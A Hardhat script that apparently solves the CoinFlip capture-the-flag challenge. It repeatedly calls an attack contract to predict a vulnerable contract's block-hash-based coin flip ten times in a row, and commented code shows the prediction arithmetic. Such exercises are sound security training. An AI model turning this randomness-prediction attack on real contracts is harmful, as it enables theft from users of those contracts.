const { getNamedAccounts, ethers, network } = require("hardhat")
const {
    developmentChains,
    networkConfig,
    STANDARD_FEE_VALUE,
} = require("../helper-hardhat-config")

/**
 * The objective is to sucessfully guess the right coin flip outcome 10 times in a row.
 */

// Prerequisite: CoinFlipAttack must be deployed beforehand

async function performHack() {
    const { deployer, player } = await getNamedAccounts()
    console.log("-------------------------------------")
    console.log("Retrieving contracts and hacker address...")
    let vulnerableContract, attackContract, hacker, consecutiveWins
    const maxAttempts = 50
    let attemptCounter = 1

    const chainId = network.config.chainId
    if (developmentChains.includes(network.name)) {
        hacker = player
        vulnerableContract = await ethers.getContract("CoinFlip", hacker)
        attackContract = await ethers.getContract("CoinFlipAttack", hacker)
    } else {
        hacker = deployer
        vulnerableContract = await ethers.getContractAt(
            "CoinFlip",
            networkConfig[chainId]["coinflipContractAddress"],
            hacker
        )
        attackContract = await ethers.getContractAt(
            "CoinFlipAttack",
            networkConfig[chainId]["coinflipAttackContractAddress"],
            hacker
        )
    }
    console.log("Done!")
    console.log("-------------------------------------")
    console.log("Showing initial information...")
    await showInitialInformation(vulnerableContract)
    consecutiveWins = await vulnerableContract.consecutiveWins()
    while (attemptCounter < maxAttempts && consecutiveWins < 10) {
        console.log(`Attempt number: ${attemptCounter}`)
        console.log("-------------------------------------")
        console.log("Step 1: Calling the attack contract's function...")
        consecutiveWins = await callFlipFunction(
            vulnerableContract,
            attackContract
        )
        console.log("-------------------------------------")
        attemptCounter++
    }
    if (consecutiveWins >= 10) {
        console.log("Challenge Success")
    } else {
        console.log("Challenge Fail")
    }
}

async function showInitialInformation(vulnerableContract) {
    console.log(`Hacker is ${await vulnerableContract.signer.address}`)
}

async function callFlipFunction(vulnerableContract, attackContract) {
    const tx = await attackContract.initiateAttack()
    await tx.wait(1)
    const consecutiveWins = await vulnerableContract.consecutiveWins()
    console.log(`Consecutive wins after attempt: ${consecutiveWins}`)
    return consecutiveWins
}

performHack()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })

// For later to reverse transaction if transaction did not go through target block
// A reverse transaction must be submitted with same nonce
// const tx = {
//     to: {CONTRACT_ADDR},
//     nonce: x,
//     gasLimit: 58000 (just check what its consumed before and add some),
//     gasPrice: ethers.utils.parsUnits('100', 'gwei')
//     data: {TRANSACTION DATA IN HEX}

// async function guessRandomValue(vulnerableContract) {
//     const FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968
//     In the contract, block.number seems to take the value of the block where the transaction is validated,
//     not the latest block at the time when the transaction is submitted
//     When the transaction is mined, block.number will at least take the value of current block + 1
//     because a new block was created to validate the transaction.
//     const blockValue = Number((await ethers.provider.getBlock("latest")).hash)
//     console.log(blockValue)
//     console.log(blockValue / FACTOR)
//     const coinFlipGuess = Boolean(Math.floor(blockValue / FACTOR))
//     console.log(`Guess: ${coinFlipGuess}`)
//     console.log(
//         `Consecutive wins before attempt: ${await vulnerableContract.consecutiveWins()}`
//     )
//     return coinFlipGuess
// }
